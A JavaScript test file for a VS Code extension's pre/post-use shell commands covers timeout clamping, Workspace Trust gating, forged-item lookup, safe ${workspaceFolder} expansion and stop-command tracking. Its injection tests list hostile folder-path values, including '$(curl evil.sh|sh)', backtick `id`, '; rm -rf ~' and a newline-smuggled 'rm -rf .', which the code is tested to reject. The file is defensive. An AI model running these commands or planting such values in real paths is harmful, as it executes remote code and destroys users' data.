// The decisions behind preUseCommand/postUseCommand, none of which need a
// process: what counts as a command, how long one may run, WHETHER ONE MAY RUN
// AT ALL, and who is still relying on the stack a stop command would take down.
// The spawning half is test/useCommandRunner.test.mjs.
import { load } from './bundle.mjs';

export default async function ({ ok, eq }) {
  const {
    clampPreUseTimeoutMs,
    DEFAULT_PRE_USE_TIMEOUT_MS,
    MIN_PRE_USE_TIMEOUT_MS,
    MAX_PRE_USE_TIMEOUT_MS,
    resolveUseCommands,
    hasUseCommands,
    expandWorkspaceFolders,
    lastLines,
    useCommandSucceeded,
    useCommandFailureMessage,
    PostUseTracker,
    StripNoticeLog,
    useCommandsFor,
    NO_USE_COMMANDS,
  } = await load('useCommands.ts');

  // --- the timeout clamp -----------------------------------------------------
  // Declared in seconds, used in milliseconds, and read from settings — so it
  // arrives as whatever JSON allows, including the two values that would break
  // the timer outright: a non-number (NaN milliseconds fires immediately) and a
  // zero (a command killed before it starts).
  eq(clampPreUseTimeoutMs(90), 90_000, '90 seconds becomes 90000ms');
  eq(clampPreUseTimeoutMs(undefined), DEFAULT_PRE_USE_TIMEOUT_MS, 'a missing value falls back to the default');
  eq(clampPreUseTimeoutMs('90'), DEFAULT_PRE_USE_TIMEOUT_MS, 'a string falls back rather than becoming NaN');
  eq(clampPreUseTimeoutMs(NaN), DEFAULT_PRE_USE_TIMEOUT_MS, 'NaN falls back — it would fire the timer at once');
  eq(clampPreUseTimeoutMs(0), MIN_PRE_USE_TIMEOUT_MS, '0 is clamped up to the floor, not honoured');
  eq(clampPreUseTimeoutMs(-30), MIN_PRE_USE_TIMEOUT_MS, 'a negative value is clamped up to the floor');
  eq(clampPreUseTimeoutMs(100_000), MAX_PRE_USE_TIMEOUT_MS, 'an unbounded wait is clamped to the ceiling');
  eq(clampPreUseTimeoutMs(1.4), MIN_PRE_USE_TIMEOUT_MS, 'a fractional value still lands inside the range');
  ok(
    MIN_PRE_USE_TIMEOUT_MS < DEFAULT_PRE_USE_TIMEOUT_MS &&
      DEFAULT_PRE_USE_TIMEOUT_MS < MAX_PRE_USE_TIMEOUT_MS,
    'the default sits inside the clamp range, so the default is never itself reclamped'
  );

  // --- the trust gate --------------------------------------------------------
  // The security-relevant part. These fields execute arbitrary shell commands,
  // and remoteVnc.pages/remoteVnc.connections are workspace-settable by design,
  // so a cloned repository must not be able to ship one that runs when you open
  // its saved entry. Machine scope — the fix remoteVnc.chromePath got for the
  // same class of defect — is not available here, because the legitimate case
  // IS a workspace entry. Workspace Trust is the gate instead.
  const source = { preUseCommand: 'up', postUseCommand: 'down', preUseTimeout: 90 };

  const userUntrusted = resolveUseCommands(source, { fromWorkspace: false, isTrusted: false });
  eq(
    [userUntrusted.commands.preUseCommand, userUntrusted.commands.postUseCommand],
    ['up', 'down'],
    'a USER-scoped entry keeps its commands even in an untrusted workspace — the user wrote them'
  );
  eq(userUntrusted.stripped, [], 'and nothing is reported as stripped');

  const workspaceUntrusted = resolveUseCommands(source, { fromWorkspace: true, isTrusted: false });
  eq(
    workspaceUntrusted.commands.preUseCommand,
    undefined,
    'a WORKSPACE-scoped preUseCommand is dropped in an untrusted workspace'
  );
  eq(
    workspaceUntrusted.commands.postUseCommand,
    undefined,
    'and so is its postUseCommand — a stop command is a command too'
  );
  eq(
    workspaceUntrusted.stripped,
    ['preUseCommand', 'postUseCommand'],
    'both are reported, because a silently ignored command is its own trap'
  );
  eq(
    workspaceUntrusted.commands.preUseTimeoutMs,
    90_000,
    'the entry itself is untouched — only the commands are stripped'
  );

  const workspaceTrusted = resolveUseCommands(source, { fromWorkspace: true, isTrusted: true });
  eq(
    [workspaceTrusted.commands.preUseCommand, workspaceTrusted.commands.postUseCommand],
    ['up', 'down'],
    'a trusted workspace keeps its commands — this is the case the feature was written for'
  );

  // Only the fields that were actually there are reported: an entry with no
  // commands must not produce a notice on every tree refresh.
  eq(
    resolveUseCommands({ postUseCommand: 'down' }, { fromWorkspace: true, isTrusted: false }).stripped,
    ['postUseCommand'],
    'only the fields that were present are reported as stripped'
  );
  eq(
    resolveUseCommands({ name: 'x' }, { fromWorkspace: true, isTrusted: false }).stripped,
    [],
    'an entry with no commands reports nothing stripped'
  );

  // --- what counts as a command ---------------------------------------------
  const trusted = { fromWorkspace: false, isTrusted: true };
  eq(resolveUseCommands({ preUseCommand: '   ' }, trusted).commands.preUseCommand, undefined, 'a whitespace-only command is not a command');
  eq(resolveUseCommands({ preUseCommand: '' }, trusted).commands.preUseCommand, undefined, 'an empty command is not a command');
  eq(resolveUseCommands({ preUseCommand: 42 }, trusted).commands.preUseCommand, undefined, 'a non-string command is not a command');
  eq(resolveUseCommands({ preUseCommand: ['a'] }, trusted).commands.preUseCommand, undefined, 'an array command is not a command');
  eq(resolveUseCommands({ preUseCommand: '  up  ' }, trusted).commands.preUseCommand, 'up', 'a command is trimmed');
  eq(resolveUseCommands(undefined, trusted).commands.preUseTimeoutMs, DEFAULT_PRE_USE_TIMEOUT_MS, 'a missing source still yields a usable timeout');

  ok(!hasUseCommands(resolveUseCommands(undefined, trusted).commands), 'an entry with neither command has nothing to run');
  ok(hasUseCommands(resolveUseCommands({ postUseCommand: 'x' }, trusted).commands), 'a post-only entry does have something to run');

  // --- the gate at the command surface ---------------------------------------
  // The trust gate above only ever sees entries this window read out of
  // settings. The tree commands (remoteVnc.openPageItem, remoteVnc.
  // connectConnection) are registered with vscode.commands.registerCommand,
  // which any other extension in the window — and any keybinding's `args` —
  // can invoke with an item of its own making. Such an item never passed the
  // gate at all, so its `use` must not be what runs: the name is looked up
  // again among the entries this window resolved.
  const resolvedEntries = [
    { name: 'kiosk', use: { preUseCommand: 'barto-mac up', preUseTimeoutMs: 60_000 } },
    { name: 'design', use: { preUseTimeoutMs: 60_000 } },
  ];
  eq(
    useCommandsFor(resolvedEntries, 'kiosk').preUseCommand,
    'barto-mac up',
    'a name this window knows resolves to the commands this window resolved'
  );
  eq(
    useCommandsFor(resolvedEntries, 'not-in-settings'),
    NO_USE_COMMANDS,
    'a name it does not know runs nothing — which is also the answer for a forged item'
  );
  eq(
    [NO_USE_COMMANDS.preUseCommand, NO_USE_COMMANDS.postUseCommand],
    [undefined, undefined],
    'and "nothing" really is nothing: no start command and no stop command'
  );
  eq(
    NO_USE_COMMANDS.preUseTimeoutMs,
    DEFAULT_PRE_USE_TIMEOUT_MS,
    'while still carrying a usable timeout, so no caller has to special-case it'
  );
  ok(
    Object.isFrozen(NO_USE_COMMANDS),
    'and it is frozen — it is shared, so one caller mutating it would arm every later one'
  );

  // --- ${workspaceFolder} substitution ---------------------------------------
  // VS Code does NOT expand variables in arbitrary settings, so this is that
  // expansion. The multi-root form is the one that matters: the command this
  // was written for lives in a sibling repository whose checkout path no shell
  // can work out.
  const folders = [
    { name: 'app', path: '/w/app' },
    { name: 'barto-devcontainer', path: '/w/dc' },
  ];
  eq(
    expandWorkspaceFolders('${workspaceFolder}/run.sh', folders).command,
    '/w/app/run.sh',
    'the bare form takes the first folder'
  );
  eq(
    expandWorkspaceFolders('${workspaceFolder:barto-devcontainer}/bootstrap/mac up', folders).command,
    '/w/dc/bootstrap/mac up',
    'the named form takes the folder with that name'
  );
  eq(
    expandWorkspaceFolders('${workspaceFolder} && ${workspaceFolder:app}', folders).command,
    '/w/app && /w/app',
    'every occurrence is substituted, not just the first'
  );
  // The shell's own expansions are none of our business: rewriting or
  // rejecting them would break commands that have nothing to do with us.
  eq(
    expandWorkspaceFolders('PATH=${PATH} ${HOME:-/tmp}/x', folders).command,
    'PATH=${PATH} ${HOME:-/tmp}/x',
    'other ${...} forms are left for the shell'
  );
  // --- a folder path is data, and it is about to become shell source --------
  // The expansion goes into `spawn(command, { shell: true })`, i.e. `sh -c`.
  // Directory names may legally contain `$( )`, backticks and semicolons on
  // macOS and Linux, so a cloned repo (or an unzipped archive) can put shell
  // code where a path is expected and have a *user-level* preUseCommand — one
  // Workspace Trust does not gate, by design — carry it into a shell.
  //
  // Quoting at the call site is not the fix people expect it to be: `$( )` and
  // backticks are still expanded inside double quotes, and single quotes are
  // not portable to cmd.exe. So the substitution refuses instead, through the
  // failure channel the unresolvable cases already use.
  for (const hostile of [
    '/w/$(curl evil.sh|sh)',
    '/w/`id`',
    '/w/a;rm -rf ~',
    '/w/a&&touch pwned',
    '/w/a|tee x',
    '/w/a\nrm -rf .',
  ]) {
    const bad = expandWorkspaceFolders('${workspaceFolder}/run.sh', [{ name: 'app', path: hostile }]);
    eq(bad.command, undefined, `a folder path containing shell syntax yields no command (${JSON.stringify(hostile)})`);
    ok(/shell/i.test(bad.error ?? ''), 'and the error says why, rather than failing somewhere downstream');
  }

  // Ordinary paths must keep working, including the ones that look unusual:
  // spaces are everywhere on macOS, and a non-ASCII home directory is not an
  // attack. An over-tight rule here would break real setups silently.
  for (const fine of ['/Users/me/My Project', '/w/app-2.0', '/Users/私/café', 'C:\\Users\\me\\app']) {
    const good = expandWorkspaceFolders('${workspaceFolder}/run.sh', [{ name: 'app', path: fine }]);
    eq(good.command, `${fine}/run.sh`, `an ordinary path is substituted unchanged (${fine})`);
  }

  // An empty string is the dangerous answer here — `rm -rf ${wf}/out` with
  // nothing substituted is not a command anybody meant to run.
  const missingName = expandWorkspaceFolders('${workspaceFolder:nope}/x', folders);
  eq(missingName.command, undefined, 'an unknown folder name yields no command at all');
  ok(/nope/.test(missingName.error ?? ''), 'and the error names the folder that was asked for');
  ok(
    /barto-devcontainer/.test(missingName.error ?? ''),
    'and lists the names that do exist, which is the only way to fix a typo'
  );
  const noFolders = expandWorkspaceFolders('${workspaceFolder}/x', []);
  eq(noFolders.command, undefined, 'no open folder yields no command');
  ok(/no folder is open/.test(noFolders.error ?? ''), 'and says so');
  eq(expandWorkspaceFolders('echo hi', []).command, 'echo hi', 'a command with no variables needs no folders');

  // --- what the user is told when it fails -----------------------------------
  const tail = 'a\n\nb\nc\nd\n';
  eq(lastLines(tail, 3), 'b\nc\nd', 'the last lines are kept and blank ones dropped');
  eq(lastLines('', 3), '', 'no output yields no tail');
  eq(lastLines('only\n', 3), 'only', 'fewer lines than asked for is not an error');

  ok(useCommandSucceeded({ code: 0, signal: null, timedOut: false, output: '' }), 'exit 0 is success');
  ok(!useCommandSucceeded({ code: 1, signal: null, timedOut: false, output: '' }), 'a non-zero exit is not');
  ok(!useCommandSucceeded({ code: null, signal: 'SIGKILL', timedOut: true, output: '' }), 'a timeout is not');
  ok(
    !useCommandSucceeded({ code: 0, signal: null, timedOut: false, spawnError: 'ENOENT', output: '' }),
    'and neither is a shell that never started, whatever code it reports'
  );

  // Three things have to survive into the notification, because they are the
  // three a user needs in order to act: which entry, how it failed, and what
  // the command actually said.
  const failed = useCommandFailureMessage(
    'barto-ui-mock',
    { code: 3, signal: null, timedOut: false, output: 'building…\nfatal: no such target\n' },
    90_000
  );
  ok(/barto-ui-mock/.test(failed), 'the failure message names the entry');
  ok(/code 3/.test(failed), 'and the exit code');
  ok(/fatal: no such target/.test(failed), 'and the last lines of what it printed');
  ok(/output channel/i.test(failed), 'and where the rest of the output is');

  const timedOut = useCommandFailureMessage(
    'kiosk',
    { code: null, signal: 'SIGKILL', timedOut: true, output: '' },
    90_000
  );
  ok(/timed out after 90s/.test(timedOut), 'a timeout says how long it waited, in the units the setting uses');
  ok(!/code null/.test(timedOut), 'and does not report a meaningless exit code alongside it');

  const noShell = useCommandFailureMessage(
    'kiosk',
    { code: null, signal: null, timedOut: false, spawnError: 'spawn /bin/sh ENOENT', output: '' },
    60_000
  );
  ok(/could not start/.test(noShell), 'a shell that would not start says so rather than reporting an exit code');

  // --- who still needs the stack ---------------------------------------------
  // Keyed by the COMMAND, so two saved entries that manage the same stack share
  // one claim and closing the first tab does not stop it under the second.
  {
    const t = new PostUseTracker();
    t.acquire('barto-mac stop', 'a');
    t.acquire('barto-mac stop', 'b');
    eq(t.release('a'), undefined, 'the first holder to go does NOT run the stop command');
    eq(t.pending, 1, 'and the claim is still held');
    eq(t.release('b'), 'barto-mac stop', 'the last holder to go runs it');
    eq(t.pending, 0, 'and the claim is gone');
  }
  {
    // The same hazard pagePanel's onDidDispose guards by identity: a stale
    // dispose must not release a claim a newer panel took out.
    const t = new PostUseTracker();
    t.acquire('stop', 'old');
    eq(t.release('old'), 'stop', 'the only holder releases the command');
    t.acquire('stop', 'new');
    eq(t.release('old'), undefined, 'a second release of a dead token does nothing');
    eq(t.pending, 1, "and leaves the newer panel's claim standing");
    eq(t.release('unknown'), undefined, 'a token nobody ever held does nothing');
    eq(t.release('new'), 'stop', 'and the newer holder still runs it when it goes');
  }
  {
    const t = new PostUseTracker();
    t.acquire('stopA', 'a');
    t.acquire('stopB', 'b');
    eq(t.release('a'), 'stopA', 'unrelated commands are tracked independently');
    eq(t.pending, 1, 'and releasing one leaves the other');
  }
  {
    // Window close: panels do not reliably get their dispose handlers.
    const t = new PostUseTracker();
    t.acquire('stopA', 'a');
    t.acquire('stopA', 'a2');
    t.acquire('stopB', 'b');
    eq(t.drain().sort(), ['stopA', 'stopB'], 'a drain yields every outstanding command exactly once');
    eq(t.pending, 0, 'and clears them');
    eq(t.release('a'), undefined, 'a dispose arriving after the drain does not run it a second time');
  }

  // --- the strip notice ------------------------------------------------------
  // collectPages/collectConnections run on every tree refresh and every quick
  // pick, so an unconditional warn would bury the notice in its own repetitions.
  {
    const notices = new StripNoticeLog();
    const first = notices.notice('page', 'kiosk', ['preUseCommand', 'postUseCommand']);
    ok(/kiosk/.test(first ?? ''), 'the notice names the entry');
    ok(/preUseCommand and postUseCommand/.test(first ?? ''), 'and the fields that were dropped');
    ok(/trusted workspace/.test(first ?? ''), 'and why');
    ok(/Manage Workspace Trust/.test(first ?? ''), 'and what to do about it');
    eq(
      notices.notice('page', 'kiosk', ['preUseCommand', 'postUseCommand']),
      undefined,
      'the same notice is not repeated'
    );
    ok(notices.notice('page', 'other', ['preUseCommand']), 'a different entry is still reported');
    ok(notices.notice('connection', 'kiosk', ['preUseCommand']), 'and so is a different kind');
    eq(notices.notice('page', 'clean', []), undefined, 'nothing stripped means nothing said');
  }
}
